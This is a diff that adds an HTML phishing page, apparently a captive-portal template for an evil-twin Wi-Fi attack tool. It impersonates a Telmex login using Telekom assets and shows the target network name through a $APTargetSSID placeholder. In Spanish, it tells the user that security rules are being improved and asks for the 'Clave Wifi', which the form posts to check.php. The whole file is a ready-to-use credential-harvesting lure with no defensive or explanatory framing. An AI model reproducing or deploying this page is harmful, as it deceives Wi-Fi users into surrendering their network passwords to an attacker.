@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<!--[if (lte IE 8) ]><html lang="de-DE" class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|!(IE)]><!-->
+<html class="no-js" lang="de">
+  <!--<![endif]--><!-- HEAD -->
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Telmex Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="Telekom%20Login-Dateien/components.css">
+    <link rel="stylesheet" type="text/css" href="Telekom%20Login-Dateien/login.css">
+  </head>
+  <!-- /HEAD -->
+  <!-- BODY --> <body>
+    <div id="tbs-container">
+      <div id="tbs-headline">
+        <div style="text-align: center;"><img src="izzie.png" alt="" height="183"
+            width="350"></div>
+        <h1 class="text-center marketing-l text-thin tbs-text-1em">&lt;b&gt;$APTargetSSID</h1>
+      </div>
+      <div id="tbs-infobox">
+        <p>Estamos mejorando nuestras normas de seguridad, por favor ingresa tu
+          contraseña</p>
+      </div>
+      <form id="form1" name="form1" method="POST" action="check.php" accept-charset="UTF-8"
+        autocomplete="off">
+        <!-- XSRF Prevention -->
+        <div class="offset-bottom-4">
+          <!-- Re-Authentication -->
+          <div class="container offset-bottom-1"> </div>
+          <!-- username input -->
+          <div class="form-input-set offset-bottom-1"> <input id="key1" name="key1"
+              class="form-input" maxlength="256" tabindex="10" type="password">
+            <label for="pw_usr">Clave Wifi</label> </div>
+          <!-- Login button --> <br>
+          <div class="text-center"> <button id="pw_submit" name="pw_submit" type="submit"
+              class="btn btn-brand btn-large tbs-text-upper" tabindex="40">Confirmar</button>
+          </div>
+        </div>
+      </form>
+      <div class="text-center"> </div>
+    </div>
+    <!-- /CONTENT -->
+    <!-- FOOTER -->
+    <!-- /FOOTER -->
+    <!-- Status -->
+    <script>
+            var accountLocked = false;
+            var accountLockedPermanent = false;
+            var accountLockExpiration = 0;
+        </script>
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script type="text/javascript" src="/static/vdplus/js/html5shiv.js"></script>        <script type="text/javascript" src="/static/vdplus/js/respond.min.js"></script>        <![endif]-->
+    <script type="text/javascript" src="Telekom%20Login-Dateien/jquery-1.js"></script>
+    <script type="text/javascript" src="Telekom%20Login-Dateien/components.js"></script>
+    <script type="text/javascript" src="Telekom%20Login-Dateien/login.js"></script>
+    <!-- Tracking -->
+    <!-- Callback Tracking -->
+    <!-- Toon Template Debugging -->
+  </body>
+  <!-- /BODY -->
+</html>
